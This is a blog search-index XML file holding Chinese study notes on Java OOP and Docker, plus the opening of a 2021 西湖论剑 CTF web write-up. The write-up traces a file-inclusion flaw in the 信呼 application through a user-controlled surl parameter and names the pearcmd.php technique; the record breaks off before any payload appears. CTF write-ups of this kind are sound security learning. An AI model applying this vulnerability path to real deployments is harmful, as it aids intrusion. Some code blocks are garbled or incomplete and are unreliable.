<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>菜鸡的刷题小记（持续更新）</title>
    <url>/2021/07/09/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><em><strong>内容重构中。。。</strong></em></p>
<span id="more"></span>

]]></content>
      <categories>
        <category>刷题笔记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Sec</tag>
      </tags>
  </entry>
  <entry>
    <title>愿天堂没有Java之面向对象</title>
    <url>/2021/12/07/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<p><em><strong>JavaSE 学习笔记（一）</strong></em></p>
<span id="more"></span>

<blockquote>
<p>Java 是一门非常严谨的语言</p>
</blockquote>
<h4 id="面向对象概述"><a href="#面向对象概述" class="headerlink" title="面向对象概述"></a>面向对象概述</h4><h5 id="认识一下嘛"><a href="#认识一下嘛" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>面向对象编程就是就是拿或找东西过来编程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;    </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1、创建一个扫描器对象，用于接收用户输入的数据</span></span><br><span class="line">    System.out.println(<span class="string">&quot;请您输入您的年龄：&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> age = sc.nextInt();</span><br><span class="line">    System.out.println(age);</span><br><span class="line">    <span class="comment">// 2、得到一个随机数对象，用于得到随机数       </span></span><br><span class="line">    <span class="keyword">int</span> data = r.nextInt(<span class="number">10</span>) + <span class="number">1</span> ; <span class="comment">// 生成 1-10之间的随机数</span></span><br><span class="line">    System.out.println(data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="定义类的注意事项"><a href="#定义类的注意事项" class="headerlink" title="定义类的注意事项"></a>定义类的注意事项</h5><ul>
<li>类名首字母大写，满足驼峰模式</li>
<li>一个 Java 文件可以定义多个类，但只有一个类可以被 public 修饰，且该类必须成为文件名称</li>
<li>一般建议一个 Java 文件只定义一个类</li>
</ul>
<h5 id="类的成分"><a href="#类的成分" class="headerlink" title="类的成分"></a>类的成分</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">  <span class="comment">// 1、成员变量</span></span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="comment">// 2、构造器</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">  <span class="comment">// 3、方法</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">  <span class="comment">// 4、代码块</span></span><br><span class="line">  <span class="keyword">static</span>&#123;&#125;</span><br><span class="line">  <span class="comment">// 5、内部类</span></span><br><span class="line">  <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Heart</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h4><h5 id="认识一下嘛-1"><a href="#认识一下嘛-1" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>初始化类的对象并返回对象的地址</li>
</ul>
<h5 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h5><ul>
<li><p>构造器格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 类名（形参列表）&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>初始化对象格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">类名 对象变量 = <span class="keyword">new</span> 构造器;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="分类和作用"><a href="#分类和作用" class="headerlink" title="分类和作用"></a>分类和作用</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 成员变量</span></span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">  <span class="comment">// 1、无参数构造器</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span></span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 2、有参数构造器</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// getter + setter方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><ul>
<li>任何类定义出来，默认自带无参构造器，写不写都存在</li>
<li>一旦定义有参构造器，无参构造器就消失了，此时就需要自定义无参构造器</li>
</ul>
<h4 id="this-关键字"><a href="#this-关键字" class="headerlink" title="this 关键字"></a>this 关键字</h4><h5 id="认识一下嘛-2"><a href="#认识一下嘛-2" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>作用：出现在成员方法中、构造器中，代表当前对象的地址，用于指定访问<strong>当前对象</strong>的成员变量、成员方法</li>
<li>this 出现在构造器或者方法中，哪个对象调用它，this 就代表哪个对象</li>
</ul>
<h4 id="面向对象三特征之一：封装"><a href="#面向对象三特征之一：封装" class="headerlink" title="面向对象三特征之一：封装"></a>面向对象三特征之一：封装</h4><h5 id="认识一下嘛-3"><a href="#认识一下嘛-3" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>基本思想：解决属性和方法属于哪个对象的问题</li>
<li>步骤：通常是将成员变量私有，然后提供方法去合理暴露</li>
<li>作用：提高业务功能设计的安全性，提高程序逻辑性和开发效率</li>
</ul>
<h5 id="标准-JavaBean"><a href="#标准-JavaBean" class="headerlink" title="标准 JavaBean"></a>标准 JavaBean</h5><ul>
<li>可以理解为实体类，其对象可以用于封装数据，符合封装的思想</li>
<li>格式<ul>
<li>成员变量用 private 修饰</li>
<li>提供每一个成员变量对应的 set 和 get 方法</li>
<li>必须提供一个无参构造器</li>
</ul>
</li>
</ul>
<h4 id="static-关键字"><a href="#static-关键字" class="headerlink" title="static 关键字"></a>static 关键字</h4><h5 id="认识一下嘛-4"><a href="#认识一下嘛-4" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>static 是静态的意思，可以修饰成员变量和成员方法</li>
<li>static 修饰表示只在内存中<strong>存储一份</strong>，可以<strong>被共享访问、修改</strong></li>
</ul>
<h5 id="修饰成员变量"><a href="#修饰成员变量" class="headerlink" title="修饰成员变量"></a>修饰成员变量</h5><ul>
<li><p>实例成员变量，无 static 修饰，属于对象，访问格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 实例成员变量</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">&#125;</span><br><span class="line">对象.实例成员变量</span><br></pre></td></tr></table></figure></li>
<li><p>静态成员变量，被 static 修饰，共享，访问格式（一般用第一种方式）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 静态成员变量</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String onlineNumber= <span class="number">161</span>;</span><br><span class="line">&#125;</span><br><span class="line">类名.静态成员变量</span><br><span class="line">对象.静态成员变量</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="修饰成员方法"><a href="#修饰成员方法" class="headerlink" title="修饰成员方法"></a>修饰成员方法</h5><ul>
<li><p>实例成员方法，无 static 修饰，属于对象，只能用对象触发访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">  System.out.println(name + <span class="string">&quot;poria&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">对象.实例成员方法</span><br></pre></td></tr></table></figure></li>
<li><p>静态成员方法，被 static 修饰，属于类，建议用类名访问，也可以用对象访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> a , <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line"> &#125;</span><br><span class="line">类名.静态成员方法</span><br><span class="line">对象.静态成员方法</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h5><ul>
<li>静态方法只能访问静态的成员，不可以直接访问实例成员</li>
<li>实例方法可以访问静态的成员，也可以访问实例成员</li>
<li>静态方法中不会出现 this 关键字</li>
</ul>
<h5 id="static-应用实例——工具类"><a href="#static-应用实例——工具类" class="headerlink" title="static 应用实例——工具类"></a>static 应用实例——工具类</h5><ul>
<li>工具类中定义的都是静态方法，调用方便，提高了代码复用（一次编写，处处可用）</li>
<li>注意事项：<ul>
<li>工具类的构造器一般都为私有，无需创建对象</li>
<li>由于工具类中都是静态方法，直接用类名索引访问即可</li>
</ul>
</li>
</ul>
<h5 id="static-应用知识——代码块"><a href="#static-应用知识——代码块" class="headerlink" title="static 应用知识——代码块"></a>static 应用知识——代码块</h5><ul>
<li><p>类的五大成分之一，定义在类中</p>
</li>
<li><p>分类</p>
<ul>
<li><p>静态代码块</p>
<ul>
<li>格式：<code>static&#123;&#125;</code></li>
<li>特点：需要通过 static 关键字修饰，随着类的加载而加载，并且<strong>自动触发、只执行一次</strong></li>
</ul>
</li>
<li><p>构造代码块（很少用到）</p>
<ul>
<li>格式：<code>&#123;&#125;</code></li>
<li>特点：每次创建对象，调用构造器执行时，都会执行该代码块中的代码，并且<strong>在构造器执行前执行</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="static-应用知识——单例设计模式"><a href="#static-应用知识——单例设计模式" class="headerlink" title="static 应用知识——单例设计模式"></a>static 应用知识——单例设计模式</h5><ul>
<li><p>单例模式：</p>
<p>可以保证系统中，应用该模式的这个类永远只有一个实例，即<strong>这个类永远只能创建一个对象</strong></p>
<p>例如任务管理器对象我们只需要一个就可以解决问题了，这样可以节省内存空间</p>
</li>
<li><p>饿汉单例</p>
<ul>
<li><p>在用类获取对象的时候，对象已经提前创建好</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 定义一个单例类 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingleInstance</span> </span>&#123;</span><br><span class="line">  <span class="comment">/** 定义一个静态变量存储一个对象即可 :属于类，与类一起加载一次 */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> SingleInstance instance = <span class="keyword">new</span> SingleInstance ();</span><br><span class="line">  <span class="comment">/** 单例必须私有构造器*/</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">SingleInstance</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;创建了对象&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>设计步骤：</p>
<ul>
<li>定义一个类，把构造器私有</li>
<li>定义一个静态变量储存一个对象</li>
</ul>
</li>
</ul>
</li>
<li><p>懒汉单例</p>
<ul>
<li><p>在真正需要对象的时候，才去创建一个对象（延迟加载）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 定义一个单例类 */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleInstance</span></span>&#123;</span><br><span class="line">  <span class="comment">/** 定义一个静态变量存储一个对象即可 :属于类，与类一起加载一次 */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> SingleInstance instance ; <span class="comment">// null</span></span><br><span class="line">  <span class="comment">/** 单例必须私有构造器*/</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">SingleInstance</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">  <span class="comment">/** 必须提供一个方法返回一个单例对象  */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingleInstance <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> ...;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>设计步骤</p>
<ul>
<li>定义一个类，把构造器私有</li>
<li>定义一个静态变量存储一个对象</li>
<li>提供一个返回单例对象的方法</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="面向对象三特征之二：继承"><a href="#面向对象三特征之二：继承" class="headerlink" title="面向对象三特征之二：继承"></a>面向对象三特征之二：继承</h4><h5 id="认识一下嘛-5"><a href="#认识一下嘛-5" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li><p>Java中提供一个关键字extends，用这个关键字，可以让一个类和另一个类建立起父子关系</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">People</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>Student 成为子类（派生类），People 称为父类（基类、超类）</p>
</li>
<li><p>提高了代码复用，减少代码冗余，增强类的功能拓展性</p>
</li>
</ul>
<h5 id="设计规范"><a href="#设计规范" class="headerlink" title="设计规范"></a>设计规范</h5><ul>
<li>子类们的相同特征（共性属性、共性方法）放在父类中定义</li>
<li>子类独有的属性和行为应该定义在自己的类中</li>
</ul>
<h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ul>
<li>子类可以继承父类的属性（变量）和行为（方法），但是不能继承父类构造器</li>
<li>Java 是单继承模式，一个类只能继承一个父类（不然就乱伦了</li>
<li>Java 支持多层继承</li>
<li>Java 中所有类都是 Object 的子类，Object 是祖宗类</li>
<li>子类是否可以继承父类的私有成员？<ul>
<li>我认为，可以继承，只是不能访问到</li>
</ul>
</li>
<li>子类是否可以继承父类的静态成员和方法？<ul>
<li>我认为，不能继承，虽然子类可以使用父类的静态成员和方法，但是这是 static 的共享特性，共享并非是继承</li>
</ul>
</li>
</ul>
<h5 id="索引访问特点"><a href="#索引访问特点" class="headerlink" title="索引访问特点"></a>索引访问特点</h5><ul>
<li><p>在子类方法中访问成员和方法满足<strong>就近原则</strong>，子类中找不到找父类，父类中找不到就报错（可以类比于 JavaScript 中的原型链）</p>
</li>
<li><p>如果在子父类中出现了重名的成员或方法，而此时一定要在子类中调用父类的成员或方法时，需要用到 super 关键字，指定访问父类的成员或方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">super</span>.父类成员变量</span><br><span class="line"><span class="keyword">super</span>.父类成员方法  </span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h5><ul>
<li>子类写一个与父类一样的方法覆盖父类的方法</li>
<li><code>@Override</code>注解是放在重写后的方法上，作为重写是否正确的校验注解</li>
<li>注意事项和要求<ul>
<li>重写方法的名称、形参列表必须和被重写的方法一致（重写不是改写，戏说不是胡说）</li>
<li>私有方法不能被重写，静态方法不能被重写</li>
<li>子类重写父类方法时，访问权限必须大于或者等于父类</li>
</ul>
</li>
</ul>
<h5 id="子类构造器"><a href="#子类构造器" class="headerlink" title="子类构造器"></a>子类构造器</h5><ul>
<li>子类中所有的构造器会默认先访问父类中无参构造器，然后再执行自己的</li>
<li>子类初始化之前，一定要调用父类构造器先完成父类数据空间的初始化</li>
<li>子类构造器的第一行语句默认都是：<strong>super()，不写也存在</strong></li>
<li>如果父类中没有无参构造器，那么此时就会报错，子类就需要手动书写<code>super()</code>来调用父类的有参构造器</li>
</ul>
<h4 id="面向对象三特征之：多态"><a href="#面向对象三特征之：多态" class="headerlink" title="面向对象三特征之：多态"></a>面向对象三特征之：多态</h4><h5 id="认识一下嘛-6"><a href="#认识一下嘛-6" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li><p>同类型的对象，执行同一个行为，会表现出不同的行为特征</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">父类类型 对象名称 = <span class="keyword">new</span> 子类构造器;</span><br><span class="line">接口 对象名称 = <span class="keyword">new</span> 实现类构造器;</span><br></pre></td></tr></table></figure></li>
<li><p>特点</p>
<ul>
<li>方法调用：编译看左边（父类），运行看右边（子类）</li>
<li>变量调用：编译看左边，运行看左边（也就是说多态侧重行为多态）</li>
</ul>
</li>
</ul>
<h5 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h5><ul>
<li><p>在多态形式下，右边对象可以实现解耦合，便于维护和拓展</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Animal a = <span class="keyword">new</span> Tortoise();</span><br><span class="line">a.run(); <span class="comment">// 后续业务行为随对象而变，后续代码无需修改</span></span><br><span class="line"></span><br><span class="line">Animal a = <span class="keyword">new</span> Dog();</span><br><span class="line">a.run(); <span class="comment">// 后续业务行为随对象而变，后续代码无需修改</span></span><br></pre></td></tr></table></figure></li>
<li><p>同时也产生一个问题，就是多态下不可以使用子类独有功能</p>
</li>
</ul>
<h5 id="多态下引用数据类型转换"><a href="#多态下引用数据类型转换" class="headerlink" title="多态下引用数据类型转换"></a>多态下引用数据类型转换</h5><ul>
<li><p>自动类型转换：子类对象赋值给父类类型的变量指向</p>
</li>
<li><p>强制类型转换</p>
<ul>
<li><p>格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">子类 对象变量 = (子类)父类类型的变量</span><br></pre></td></tr></table></figure></li>
<li><p>可以解决多态产生的问题，可以实现子类调用自己独有的功能</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Animal a = <span class="keyword">new</span> Dog();</span><br><span class="line">Dog d = (Dog)a</span><br></pre></td></tr></table></figure></li>
<li><p>Java 建议强类型转换前使用<code>instanceof</code>判断当前对象的真实类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">变量名 <span class="keyword">instanceof</span> 真实类型</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Develop</tag>
      </tags>
  </entry>
  <entry>
    <title>初探Docker小蓝鲸</title>
    <url>/2021/12/06/%E5%88%9D%E6%8E%A2Docker/%E5%88%9D%E6%8E%A2Docker/</url>
    <content><![CDATA[<p><em><strong>之前在参与举办我们学校新生杯的时候，因为需要就系统地学习了一下 Docker 技术，最近做了个小小的总结</strong></em></p>
<span id="more"></span>

<h3 id="初识-Docker"><a href="#初识-Docker" class="headerlink" title="初识 Docker"></a>初识 Docker</h3><h4 id="Docker-概念"><a href="#Docker-概念" class="headerlink" title="Docker 概念"></a>Docker 概念</h4><ul>
<li>Dokcer 是一个开源的应用容器引擎</li>
<li>基于 Go 语言实现</li>
<li>容器完全使用沙箱机制，相互隔离</li>
<li>容器性能开销极低</li>
</ul>
<h4 id="Docker-安装"><a href="#Docker-安装" class="headerlink" title="Docker 安装"></a>Docker 安装</h4><ul>
<li><p>脚本安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL get.docker.com -o get-docker.sh</span><br><span class="line">sudo sh get-docker.sh --mirror Aliyun</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Docker-架构"><a href="#Docker-架构" class="headerlink" title="Docker 架构"></a>Docker 架构</h4><ul>
<li>镜像（image）：相当于是一个 root 文件系统</li>
<li>容器（container）：镜像和容器的关系，就像是面向对象程序设计中的类和对象一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等</li>
<li>仓库（repository）：仓库看作是一个代码控制中心，用来保存镜像</li>
</ul>
<h4 id="Docker-配置加速器"><a href="#Docker-配置加速器" class="headerlink" title="Docker 配置加速器"></a>Docker 配置加速器</h4><ul>
<li><p>配置阿里云</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">打开配置文件</span></span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">添加配置</span></span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">执行命令生效</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Docker-命令"><a href="#Docker-命令" class="headerlink" title="Docker 命令"></a>Docker 命令</h3><h4 id="进程相关命令"><a href="#进程相关命令" class="headerlink" title="进程相关命令"></a>进程相关命令</h4><ul>
<li><p>启动 docker</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure></li>
<li><p>停止 docker</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl stop docke</span><br></pre></td></tr></table></figure></li>
<li><p>重启 docker</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure></li>
<li><p>查看 docker 服务状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure></li>
<li><p>设置开机启动 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="镜像相关命令"><a href="#镜像相关命令" class="headerlink" title="镜像相关命令"></a>镜像相关命令</h4><ul>
<li><p>查看镜像：查看本地所有镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker images -q #查看所用镜像 id</span><br></pre></td></tr></table></figure></li>
<li><p>搜索镜像：从网络中查看需要的镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search 镜像名称</span><br></pre></td></tr></table></figure></li>
<li><p>拉取镜像：l从Docker仓库下载镜像到本地，镜像名称格式为 名称:版本号，如果版本号不指定则是最新的版本。如果不知道镜像版本，可以去docker hub 搜索对应镜像查看</p>
</li>
<li><p>```shell<br>docker pull 镜像名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 删除镜像</span><br><span class="line"></span><br><span class="line">  ```shell</span><br><span class="line">  docker rmi 镜像id #删除本地镜像</span><br><span class="line">  docker rmi `docker images -q` #删除本地所有镜像</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="容器相关命令"><a href="#容器相关命令" class="headerlink" title="容器相关命令"></a>容器相关命令</h4><ul>
<li><p>查看容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps #查看正在运行的容器</span><br><span class="line">docker ps -a #查看所有容器</span><br></pre></td></tr></table></figure></li>
<li><p>创建容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run 参数</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>-i：保持容器运行，通常与 -t 参数一起使用</code></li>
<li><code>-t：为容器分配一个伪终端</code></li>
<li><code>-d：以守护模式运行容器，创建一个容器在后台运行</code></li>
<li><code>--name：为创建的容器命名</code></li>
</ul>
</li>
<li><p>进入容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec 参数 #退出容器，容器不会关闭</span><br></pre></td></tr></table></figure></li>
<li><p>启动容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start 容器名称</span><br></pre></td></tr></table></figure></li>
<li><p>停止容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker stop 容器名称</span><br></pre></td></tr></table></figure></li>
<li><p>删除容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dokcer rm 容器名称</span><br></pre></td></tr></table></figure></li>
<li><p>查看容器信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dokcer inspect 容器名</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Docker-数据卷"><a href="#Docker-数据卷" class="headerlink" title="Docker 数据卷"></a>Docker 数据卷</h3><h4 id="数据卷概念"><a href="#数据卷概念" class="headerlink" title="数据卷概念"></a>数据卷概念</h4><ul>
<li>数据卷是宿主机中的一个目录或文件</li>
<li>当容器目录和数据卷绑定之后，两者的修改是同步的</li>
<li>一个数据卷可以被多个容器挂载，一个容器也可以挂载多个数据卷</li>
<li>作用<ul>
<li>容器数据持久化</li>
<li>外部机器和容器间接通信</li>
<li>容器之间数据交换</li>
</ul>
</li>
</ul>
<h4 id="数据卷配置"><a href="#数据卷配置" class="headerlink" title="数据卷配置"></a>数据卷配置</h4><ul>
<li><p>创建容器时，设置数据卷</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run ... -v 宿主机目录:容器内目录 ...</span><br></pre></td></tr></table></figure>

<ul>
<li>注意事项：<ol>
<li>目录必须是绝对路径</li>
<li>如果目录不存在，则自动创建</li>
<li>可以挂载多个数据卷</li>
</ol>
</li>
</ul>
</li>
</ul>
<h4 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h4><h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><h4 id="镜像制作"><a href="#镜像制作" class="headerlink" title="镜像制作"></a>镜像制作</h4><ul>
<li><p>容器转镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker commit 容器id 镜像名称:版本号</span><br><span class="line">docker save -o 压缩文件名称 镜像名称:版本号</span><br><span class="line">docker load -i 压缩文件名称</span><br></pre></td></tr></table></figure></li>
<li><p>Dockerfile</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">定义父镜像：FROM centos:7</span><br><span class="line">定义作者信息：MAINTAINER  itheima &lt;itheima@itcast.cn&gt;</span><br><span class="line">执行安装vim命令： RUN yum install -y vim</span><br><span class="line">定义默认的工作目录：WORKDIR /usr</span><br><span class="line">定义容器启动执行的命令：CMD /bin/bash</span><br><span class="line">通过dockerfile构建镜像：docker bulid –f dockerfile文件路径 –t 镜像名称:版本</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Develop</tag>
      </tags>
  </entry>
  <entry>
    <title>2021西湖论剑初赛 Web</title>
    <url>/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/</url>
    <content><![CDATA[<p><em><strong>西湖论剑果然很顶啊，5道 web 解了4道，感觉时间有点不太够，太菜了呜呜呜</strong></em></p>
<span id="more"></span>

<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>是个信呼的web应用，老洞都打不了，没有给写入的权限，</p>
<p>所以我们需要去找新的利用点</p>
<p><img src="/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/image-20211120212655218.png" alt="image-20211120212655218.png"></p>
<p>这个地方把他生成的方法类中的displayfile传入到了下面的mpathname中</p>
<p><img src="/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/image-20211120212824367.png" alt="image-20211120212824367"></p>
<p>于是在这个位置就可能会造成任意文件包含</p>
<p>然后全局搜索一下那个displayfile</p>
<p>发现在webmain/index/indexAction.php中的getshtmlAction方法里传入一个surl，然后经过拼接传入到了displayfile中，而surl是我们可控的，所以这里确实存在一个文件包含</p>
<p><img src="/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/image-20211120213157183.png" alt="image-20211120213157183"></p>
<p>这里因为拼接了后缀为php，而我们没有上传文件的权限，所以只能包含已经有的文件。然后就想到前阵子p神提出的pearcmd.php的利用。</p>
